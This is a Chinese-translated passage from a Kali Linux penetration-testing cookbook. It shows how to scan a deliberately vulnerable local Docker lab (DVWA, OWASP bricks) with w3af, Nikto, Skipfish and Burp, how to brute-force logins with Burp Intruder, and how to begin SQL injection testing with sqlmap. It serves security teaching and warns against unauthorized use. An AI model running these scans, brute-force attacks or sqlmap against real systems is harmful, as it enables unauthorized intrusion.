1.  要找出正在运行的容器的当前 IP 地址，您首先需要在新的终端窗口中使用以下命令列出正在运行的容器：

```
docker ps -a

```

此命令的输出将如下面的屏幕截图所示：

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_004.jpg)

1.  然后，复制容器 ID 并输入以下命令（请记住，您的容器 ID 将与此输出中显示的不同），使用输出中显示的容器 ID：

```
docker inspect 01bf653a92f4

```

1.  输出将如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_005.jpg)

1.  这将是一个非常长的输出；为了快速找到 IP 地址，您也可以使用以下命令：

```
docker inspect 01bf653a92f4 | grep IPAddress

```

1.  输出如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_006.jpg)

1.  如图所示，`172.17.0.2`（请注意，您的 IP 地址可能与此处显示的不同。）是容器正在运行的 IP 地址；要查看安装在此容器上的易受攻击的 Web 应用程序，请复制此 IP 地址并在浏览器中打开，如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_007.jpg)

1.  如前面的屏幕截图所示，您将看到 Apache 服务器正在运行，并且您可以看到每个不同 Web 应用程序的三个不同文件夹。

1.  从下一个教程开始，我们将使用这些应用程序进行 Web 应用程序漏洞评估。

## 工作原理...

在本教程中，我们从 Docker hub 中拉取了一个预配置的 Docker 镜像，然后运行了下载的镜像，列出了正在运行的容器，并尝试使用容器 ID 找出正在运行的容器的 IP 地址，以便在浏览器上查看安装的易受攻击的 Web 应用程序。

# 使用 W3af 进行漏洞评估

在本教程中，我们将学习如何使用 W3af 在目标 Web 应用程序中查找漏洞。W3af 是一个 Web 应用程序攻击和审计框架。该项目的目标是创建一个框架，通过查找和利用所有 Web 应用程序漏洞来帮助您保护您的 Web 应用程序。

## 准备就绪

要完成本教程，您需要在 Oracle Virtualbox 上运行 Kali Linux 并连接到互联网。不需要其他先决条件。

## 操作步骤...

对于此教程，您需要执行以下步骤：

1.  打开终端并输入`w3af_gui`；w3af 窗口将如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_008.jpg)

1.  在左侧面板的配置选择器中选择**OWASP_TOP10**选项。输入目标 URL，如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_009.jpg)

1.  展开**auth**菜单，单击**详细**插件，并输入用户名和密码（仅适用于 HTTP 表单凭据）和所有其他必需的参数，然后单击**保存**，如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_010.jpg)

1.  选择**output**并展开它并选择所有输出格式；在我们的情况下，出于演示目的，我们将检查所有内容，如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_011.jpg)

1.  之后，单击开始按钮旁边的按钮；单击后，将打开以下窗口，并询问您是否知道**target_os**和**target_framework**，然后保存详细信息，如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_012.jpg)

1.  完成所有这些步骤后，只需单击**开始**按钮，扫描将开始，如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_013.jpg)

1.  一旦扫描开始，您可以遍历选项卡并单击**结果**，随着漏洞的发现，漏洞将会出现，如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_014.jpg)

1.  接下来，单击**URL**子选项卡，在那里您可以看到以漂亮站点地图形式发现和绘制的所有 URL，如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_015.jpg)

1.  在扫描运行时，您仍然可以在日志窗口中看到最新的插件运行和发现的漏洞，如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_016.jpg)

扫描完成后，结果将保存在运行 w3af 的目录中。在我们的情况下，我们从默认路径`/root/`调用，如下面的屏幕截图所示：

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_017.jpg)

## 工作原理...

在这个示例中，我们使用了`w3af_gui`并配置了各种插件，在 Docker 容器中托管的易受攻击的 Web 应用程序上进行了经过身份验证的扫描，IP 为`http://172.17.0.2/dvwa/login.php`，并演示了 w3af 在执行真实漏洞评估时的工作。W3af 的能力不仅限于漏洞评估。它还可以利用类似 sqlmap、RFI 和 Metasploit 的工具，并且也可以用于执行利用。

# 使用 Nikto 进行 Web 服务器评估

在这个示例中，我们将学习 Nikto 及其 Web 服务器扫描功能。Nikto 是一个开源（GPL）的 Web 服务器扫描程序，可以针对多个项目对 Web 服务器执行全面测试，包括超过 6700 个潜在危险的文件/程序，检查超过 1250 个服务器的过时版本，并检查超过 270 个服务器的特定版本问题。

## 准备工作

要完成这个示例，您需要在 Oracle Virtualbox 上运行 Kali Linux 并连接到互联网。不需要其他先决条件。

## 操作步骤...

对于这个示例，您需要执行以下步骤：

1.  打开终端并输入`Nikto`，Nikto 将显示其可用于使用的帮助和开关（您还可以使用主要的 Nikto 来获取每个开关的详细描述），如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_018.jpg)

1.  要开始扫描，请输入以下命令：

```
nikto -host http://172.17.0.2/wordpress/ -nossl -o wordpress-      nikto-scan.xml

```

1.  让 Nikto 完成它的工作，并等待它完成；完成后，控制台将显示以下输出：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_019.jpg)

## 工作原理...

在这个示例中，我们让 Nikto 对托管在 Docker 容器中的 Web 服务器和 Web 应用程序进行扫描，URL 为`http://172.17.0.2/wordpress/`。`-host`开关用于指定 URL。

有时，就像其他工具一样，Nikto 也会显示一些需要通过访问工具和 URL 检测到的链接手动验证的误报。但请放心；运行 Nikto 是值得的，因为它总是会通过找到一些独特和新的东西来给您惊喜。

# 使用 Skipfish 进行漏洞评估

在这个示例中，我们将学习如何使用 Skipfish。Skipfish 完全用 C 编写。它经过高度优化以处理 HTTP 请求。Skipfish 可以处理每秒 2000 个请求，如[`tools.kali.org/web-applications/skipfish`](http://tools.kali.org/web-applications/skipfish)所述。

## 准备工作

要完成这个示例，您需要在 Oracle Virtualbox 上运行 Kali Linux 并连接到互联网。不需要其他先决条件。

## 操作步骤...

对于这个示例，您需要执行以下步骤：

1.  打开终端。要启动`Skipfish`，您必须提到输出目录名称。如果输出目录不存在，它将自动创建目录并保存结果。要启动 Skipfish，请在终端中输入以下命令：

```
skipfish -o /root/dvwa-skipfish-results http://172.17.0.2      /dvwa/login.php

```

1.  在 Skipfish 开始扫描之前，它会显示屏幕上的提示列表，这有助于您了解 Skipfish 将如何针对此特定扫描进行操作：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_020.jpg)

1.  一旦 Skipfish 开始，它将开始显示扫描详细信息，发送的请求数量以及屏幕上的其他详细信息，如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_021.jpg)

1.  扫描完成后，编译所有内容并在该文件夹中创建 HTML 报告。这将在屏幕上显示以下输出：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_022.jpg)

1.  转到指定的输出目录，并在浏览器中打开 HTML，如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_023.jpg)

## 工作原理...

由于 Skipfish 是用 C 语言编写的，它是处理 HTTP 流量方面最有效的工具之一。Skipfish 能够使用`--auth-form`、`--auth-user`和`-auth-password`开关来运行经过身份验证的扫描。

默认情况下，Skipfish 将所有 URL 视为范围；如果有任何页面或 URL 不在您的测试范围内，您将明确使用`-X`开关来告诉 Skipfish 不需要扫描它。

在进行经过身份验证的扫描时，您可以使用`-X`开关指定注销链接，以确保 Skipfish 不会意外地爬取它，并最终扫描带有已注销会话的主机。

# 使用 Burp 代理拦截 HTTP 流量

在本教程中，我们将使用 Burp 代理拦截我们的浏览器流量，并在路上操纵参数。

## 准备工作

要完成本教程，您需要在 Oracle Virtualbox 上运行 Kali Linux 并连接到互联网。不需要其他先决条件。

## 操作步骤...

对于此教程，您需要执行以下步骤：

1.  要启动 Burp，请转到**菜单** | **Kali Linux** | **应用程序** | **burpsuite**并单击**启动 burpsuite**，如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_024.jpg)

1.  同时打开 Firefox，并导航到**编辑菜单** | **首选项** | **高级选项卡** | **网络** | **设置**，将代理设置为`127.0.0.1`，端口设置为`8080`，如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_025.jpg)

1.  单击**确定**，然后转到**Burp** | **代理**，如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_026.jpg)

1.  现在，回到 Firefox 窗口，打开`http://172.17.0.2/dvwa/login.php`并按下*Enter*；当你按下*Enter*时，请求将被 Burp 拦截，如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_027.jpg)

1.  单击**转发**，放弃任何被拦截的请求，并让登录页面加载。在字段中输入用户名和密码，然后单击**提交**，如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_028.jpg)

1.  打开**Burp**窗口。如您所见，提交请求在这里被拦截，并且可以以原始形式或参数形式进行操纵：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_029.jpg)

## 工作原理...

在本教程中，我们只需将 Web 浏览器配置为在连接到互联网之前在我们自己的本地机器上的端口`8080`上运行的代理。当我们在浏览器中打开任何 URL 时，它会将所有流量重定向到在端口`8080`上运行的 Burp，您可以在流离开系统之前操纵任何请求。

代理应用程序通常用于在浏览器中绕过 Web 应用程序的客户端限制。

# 使用 Burp Intruder 进行定制的攻击自动化

在这个教程中，我们将学习如何使用 Burp Intruder 执行应用程序登录暴力破解和目录暴力破解。Intruder 可以在需要进行暴力破解的任何场景中使用，并且可以根据您的要求进行定制。

## 准备工作

要完成本教程，您需要在 Oracle Virtualbox 上运行 Kali Linux 并连接到互联网。不需要其他先决条件。

## 操作步骤...

对于这个教程，您需要执行以下步骤：

1.  在浏览器中打开**Damn Vulnerable Web Application**页面，并转到**Brute Force**部分，如下截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_030.jpg)

1.  拦截 Burp 的请求，如下截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_031.jpg)

1.  如前所示，将此请求发送给 Burp 内的入侵者，选择**Intruder**选项卡，然后选择**Positions**子选项卡，如下截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_032.jpg)

1.  要使用入侵者暴力破解常见的用户名和密码，我们需要仅选择用户名和密码；其余的突出显示的参数可以通过选择它们并单击**Clear $**按钮来清除，这将确保暴力破解只会发生在选定的参数上，而不是默认情况下选择的所有参数上。![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_033.jpg)

Burp Intruder 有四种攻击类型，分别是 sniper、battering ram、pitchfork 和 cluster bomb。它默认设置为 sniper。将其更改为 battering ram。

1.  现在，当我们选择了暴力破解的参数时，我们需要设置有效负载；为此，我们将遍历有效负载选项卡，并从下拉菜单中设置有效负载集合为**1**。为了演示其工作原理，我们将输入一个小的用户名列表，如下截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_034.jpg)

1.  现在选择有效负载集合为**2**，并设置第二个参数的有效负载，如下截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_035.jpg)

1.  现在转到**选项**选项卡；这很重要，因为我们需要某种证据证明暴力破解程序已经能够检测到有效的尝试，因此，为此，我们需要在凭证错误的情况下看到错误消息，并在凭证正确的情况下看到消息。打开浏览器，输入错误的密码，如下截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_036.jpg)

1.  在凭证不正确的情况下，它会显示以下消息：

```
        Username and/or password incorrect.
```

![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_037.jpg)

1.  转到**选项** | **Grep Match Section**，删除所有字符串模式，并添加**Welcome to the password protected area admin**模式，这将表明凭证是有效的，如下截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_038.jpg)

1.  最后，在左上角的**Intruder**选项卡上单击**Start attack**，如下截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_039.jpg)

1.  一旦启动，入侵者将尝试从这两个有效负载列表中尝试所有可能的组合，并且当响应中有任何与之匹配时，grep 匹配将显示出来，如下截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_040.jpg)

## 工作原理...

在这个教程中，我们使用了 Burp Intruder，并对其进行了高度定制，以进行特定的暴力攻击。入侵者的能力不仅限于此。您也可以在发现 SQL 注入时使用它。

# 使用 Burp Sequencer 测试会话的随机性

在这个教程中，我们将学习如何使用 Burp Sequencer 工具来检查 Web 应用程序中会话令牌的随机性。

## 准备就绪

要按照这个教程，您需要在 Oracle Virtualbox 上运行 Kali Linux 并连接到互联网。不需要其他先决条件。

## 操作步骤...

对于这个教程，您需要执行以下步骤：

1.  在浏览器中打开应用程序，并使用 Burp 拦截请求，如下截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_041.jpg)

1.  我们需要分析请求的响应，转发此请求，并捕获服务器的响应，如下截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_042.jpg)

1.  由于服务器设置了`Set-Cookie PHPSESSIONID`，为了分析这个会话令牌，我们需要将其发送到 Sequencer，如下截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_043.jpg)

1.  现在打开 Burp Sequencer。为了检查随机性，Burp 需要知道请求中的位置 cookie，然后我们将开始实时捕获，如下面的屏幕截图所示：![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_044.jpg)

1.  为了执行会话随机性分析，Burp 至少需要 100 个 PHP 会话 ID。至少需要 100 个 PHP 会话 ID 来开始分析：![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_045.jpg)

1.  正如我们所看到的，**总体结果**部分显示了在 462 个请求样本中`PHPSESSID`的随机性信息。您可以将`PHPSESSID`的值保存到一个文件中，如下面的屏幕截图所示：![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_06_046.jpg)

## 它是如何工作的...

如果会话令牌容易猜测并且不够随机，攻击者可以轻松模拟用户在应用程序上的会话。在这个示例中，我们使用 Burp Sequencer 工具从 Burp 代理导入会话 ID 并对其进行分析。这个 Sequencer 也可以用于其他情况，比如处理 CSRF 等令牌。Sequencer 也可以用类似的方式来检查 CSRF 令牌的随机性。


# 第七章：Web 应用程序利用

在本章中，我们将涵盖以下示例：

+   使用 Burp 进行主动/被动扫描

+   使用 sqlmap 在登录页面上查找 SQL 注入

+   使用 sqlmap 在 URL 参数上查找 SQL 注入

+   使用 commix 进行自动 OS 命令注入

+   使用 weevely 进行文件上传漏洞

+   利用 Shellshock 使用 Burp

+   使用 Metasploit 利用 Heartbleed

+   使用 FIMAP 工具进行文件包含攻击（RFI/LFI）

# 介绍

Web 应用程序渗透测试是我们利用在漏洞评估期间发现的漏洞的阶段。

渗透测试的成功取决于迄今为止发现了多少信息和漏洞。我们发现的所有漏洞可能并不一定都能被利用。

Web 应用程序的利用并不取决于您使用的工具。这是一个在 Web 应用程序中发现安全问题的练习。Web 应用程序只是在 Web 上而不是在您的操作系统本地运行的软件。它旨在执行特定任务并为特定用户提供服务。利用 Web 应用程序的最佳方法是了解应用程序的内容以及它所完成的任务，并更多地关注应用程序的逻辑工作流程。Web 应用程序可以是不同类型和架构的；例如，使用 PHP/Java/.NET 和 MySQL/MSSQL/Postgress 的动态 Web 页面，或者使用 Web API 的单页面应用程序。当您了解 Web 应用程序的架构、底层技术和目的时，测试 Web 应用程序将更加全面。

然而，在本章中，我们有几个可用于 Kali Linux 的工具，可用于利用在 Web 应用程序中发现的漏洞。

### 注意

不要对不是您自己的公共网站和不在您自己的服务器上的网站运行本章中演示的工具。在这种情况下，我们设置了三个运行在 Docker 中的易受攻击的 Web 应用程序，以演示本章中的工具/技术。*小心！*

# 使用 Burp 进行主动/被动扫描

在本示例中，我们将使用 Burp Suite Pro 中的 Burp 扫描器，这是一款付费软件。它的价格约为每年 350 美元。它加载了许多功能，其中一些在免费版本中不可用或受限制。

Burp 套件的价格并不像其他网络应用程序扫描器那样昂贵，并且提供了许多功能，在网络应用程序渗透测试中非常有帮助。不涵盖这些内容将是不合适的，因为它是渗透测试人员在网络应用程序渗透测试中广泛使用的工具。话虽如此，让我们快速进入吧。

## 准备工作

要完成此示例，您需要在 Oracle Virtualbox 或 VMware 中运行 Kali Linux，并拥有 Burp Suite Pro 许可证。

## 如何做...

对于此示例，您需要执行以下步骤：

1.  打开 Firefox 并导航到**首选项** | **高级** | **网络** | **设置** | **手动代理配置**，将主机设置为`127.0.0.1`，主机端口设置为`8080`，并勾选**用于所有协议**，如下图所示：![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_001.jpg)

1.  打开终端并从 Docker hub 拉取 Docker 容器，如果您还没有拉取 Docker 镜像，请使用以下命令：

```
docker pull ishangirdhar/dvwabricks

```

您应该看到以下输出：

```
        docker pull ishangirdhar/dvwabricks
        Using default tag: latest
        latest: Pulling from ishangirdhar/dvwabricks
8387d9ff0016: Pull complete 
3b52deaaf0ed: Pull complete 
4bd501fad6de: Pull complete 
a3ed95caeb02: Pull complete 
790f0e8363b9: Pull complete 
11f87572ad81: Pull complete 
341e06373981: Pull complete 
709079cecfb8: Pull complete 
55bf9bbb788a: Pull complete 
b41f3cfd3d47: Pull complete 
70789ae370c5: Pull complete 
43f2fd9a6779: Pull complete 
6a0b3a1558bd: Pull complete 
934438c9af31: Pull complete 
1cfba20318ab: Pull complete 
de7f3e54c21c: Pull complete 
596da16c3b16: Pull complete 
e94007c4319f: Pull complete 
3c013e645156: Pull complete 
235b6bb50743: Pull complete 
85b524a6ea7a: Pull complete 
        Digest: sha256:        ffe0a1f90c2653ca8de89d074ff39ed634dc8010d4a96a0bba14200cdf574e3
        Status: Downloaded newer image for         ishangirdhar/dvwabricks:latest

```

1.  使用以下命令运行下载的 Docker 镜像：

```
docker run ishangirdhar/dvwabricks

```

您应该看到以下输出：

```
        docker run ishangirdhar/dvwabricks
        => An empty or uninitialized MySQL volume is detected in         /var/lib/mysql
        => Installing MySQL ...
        => Done!
        => Waiting for confirmation of MySQL service startup
        => Creating MySQL admin user with random password
        => Done!        ====================================================================
        You can now connect to this MySQL Server using:
        mysql -uadmin -pzYKhWYtlY0xF -h<host> -P<port>
        ======= snip===========
        supervisord started with pid 1
        2016-07-30 20:12:35,792 INFO spawned: 'mysqld' with pid 437
        2016-07-30 20:12:35,794 INFO spawned: 'apache2' with pid 438

```

1.  现在，要启动 Burp，请转到**代理**选项卡，单击**打开拦截**以关闭它，然后转到**HTTP 历史记录**选项卡，如下所示：![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_002.jpg)![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_003.jpg)

1.  现在，一切都设置好了，我们只需要找出运行易受攻击的 Web 应用程序的容器的 IP 地址。运行以下命令：

```
docker ps

```

1.  你应该会看到以下输出：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_004.jpg)

1.  复制容器 ID 并运行以下命令：

```
      docker inspect dda0a7880576 | grep -i ipaddress

```

1.  你应该会看到以下输出：

```
      "SecondaryIPAddresses": null,
          "IPAddress": "172.17.0.2",
            "IPAddress": "172.17.0.2",

```

1.  切换到 Firefox 窗口，在地址栏中输入前面的 IP 地址，你应该会看到下面截图中显示的内容：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_005.jpg)

1.  点击**dvwa**，然后点击**创建/重置数据库**，如下面的截图所示：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_006.jpg)

1.  你将被重定向到登录页面；输入用户名`admin`和密码`password`，这是`dvwa`的默认用户名和密码。登录后，你应该会看到以下截图：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_007.jpg)

1.  遍历整个应用程序，使用不同的模块，点击所有可能的练习并尝试一次。

1.  切换到 Burp 窗口，你会看到 Burp 在**HTTP 历史**选项卡中捕获了所有请求，如下所示：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_008.jpg)

1.  现在，转到目标选项卡，找到你的 IP 地址，右键点击它，然后点击**添加到范围**，如下面的截图所示：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_009.jpg)

1.  然后，右键点击相同的 IP，这次点击**Spider this host**，如下面的截图所示：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_010.jpg)

1.  适当地回答可能出现的弹出屏幕，并注意在**目标**选项卡中发现和列出的其他应用程序路径，如下面的截图所示：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_011.jpg)

1.  现在，右键点击相同的 IP，这次点击**主动扫描此主机**，如下面的截图所示：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_012.jpg)

1.  在扫描开始之前，你有几个选项可以选择和自定义；检查最后一项，即**删除具有以下扩展名的项目[20 个项目]**，如下面的截图所示：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_013.jpg)

1.  转到扫描器页面；它会显示各种 URL 上运行测试的进度，如下面的截图所示：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_014.jpg)

1.  现在，等待扫描完成，再次打开**目标**选项卡，你会看到检测到的不同漏洞，如下面的截图所示：![如何操作...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_015.jpg)

## 它是如何工作的...

我们已经配置了浏览器在`127.0.0.1`的`8080`端口上使用 Burp 代理，然后使用`docker pull <image-name>`命令从 Docker hub 下载了易受攻击的 Web 应用程序。然后我们使用`docker run <image-name>`命令在 Docker 容器中启动了 Docker 镜像，并使用`docker inspect <container-id>`提取了运行容器的 IP 地址。

然后我们在浏览器中导航到相同的 IP 地址并遍历应用程序，然后我们看到 Burp 如何捕获我们通过浏览器发出的每个请求。我们在范围中添加了相同的域名，然后遍历整个应用程序以找出应用程序中所有可能的 URL。最后，我们在主机上开始了主动扫描，发现了关键的漏洞，如 SQL 注入、跨站脚本和命令注入。在接下来的几个步骤中，我们将学习如何利用这次扫描获得的知识以及如何使用特定工具来利用它们。

# 使用 sqlmap 在登录页面上查找 SQL 注入

SQL 注入在 OWASP Web 应用程序前 10 大漏洞的每一次迭代中都是前三名。它们对 Web 应用程序和企业都是最具破坏性的。发现 SQL 注入是困难的，但如果你碰巧发现了一个，手动利用它直到在服务器上获得访问权限更加困难和耗时。因此，使用自动化方法非常重要，因为在渗透测试活动中，时间总是不够用的，你总是希望尽早确认 SQL 注入的存在。

Sqlmap 是一个开源的渗透测试工具，它自动化了检测和利用 SQL 注入漏洞以及接管数据库服务器的过程，使用 Python 编写，并由开发人员定期维护。SQLMap 已经成为一个强大的工具，在各种参数中识别和检测 SQL 注入非常可靠。

在这个步骤中，我们将学习如何使用 sqlmap 在目标 Web 应用程序的登录页面上查找 SQL 注入漏洞。

## 准备工作

要按照这个步骤，你需要以下内容：

+   一个互联网连接

+   Kali Linux 在 Oracle Virtualbox 中运行

+   安装 Docker 的 Kali Linux

+   下载入侵-利用 Docker 镜像

## 如何操作...

对于这个步骤，你需要执行以下步骤：

1.  打开终端，输入`sqlmap`，sqlmap 将显示其正确的用法语法，如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_016.jpg)

1.  我们将使用`http://172.17.0.2/bricks/login-1/index.php`作为我们的目标。这是一个 OWASP bricks 安装：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_017.jpg)

1.  转到**Firefox 首选项** | **高级** | **网络** | **设置**，如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_018.jpg)

1.  选择**手动代理配置**，输入**HTTP 代理**为`127.0.0.1`，**代理**为`8080`，并勾选**为所有协议使用此代理**，如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_019.jpg)

1.  点击**确定**，回到**Bricks 登录**页面；如果你还没有启动 Burp Suite，就开始启动它。你可以导航到**应用程序** | **Web 应用程序分析** | **Burpsuite**，如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_020.jpg)

1.  Burp 的窗口将打开，你可以选择一个临时项目，然后点击**开始 Burp**；你的 Burp 窗口将看起来像下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_021.jpg)

1.  现在打开 bricks 登录页面，输入任何字符串的用户名和密码，然后点击**提交**。不管你在用户名和密码字段中输入什么，因为我们将在 Burp 中拦截请求；一旦你点击登录页面上的**提交**按钮，你将看到 Burp 窗口，如下所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_022.jpg)

1.  在 Burp 窗口的任何位置右键单击，然后点击**复制到文件**菜单，如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_023.jpg)

1.  在终端上运行以下命令：

```
sqlmap -r "./Desktop/bricks-login-request.txt" --is-dba --tables       -users

```

1.  `sqlmap`命令将运行其启发式检查，并显示识别的数据库为 MySQL，并询问您是否要跳过寻找其他可能的数据库；输入*Y*并按*Enter*，因为它通常是准确的，最好在服务器上生成尽可能少的请求。看一下下面的屏幕截图：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_024.jpg)

1.  一旦你按下*Enter*，它会问你是否要保留级别和风险的值。这意味着在寻找 SQL 注入时，它尽可能少地执行请求，并且应该是尽可能少风险的 SQL 语句。最好从值`1`开始，如果不起作用，再增加级别和风险到 5；现在，我们将输入*Y*并按*Enter*，如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_025.jpg)

1.  之后，sqlmap 会提示您无法使用 NULL 值进行注入，并询问您是否希望为`- -union-char`选项使用随机整数值。这个陈述很清楚，输入*Y*并按*Enter*，如下面的屏幕截图所示：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-itrs-exp-cb/img/image_07_026.jpg)

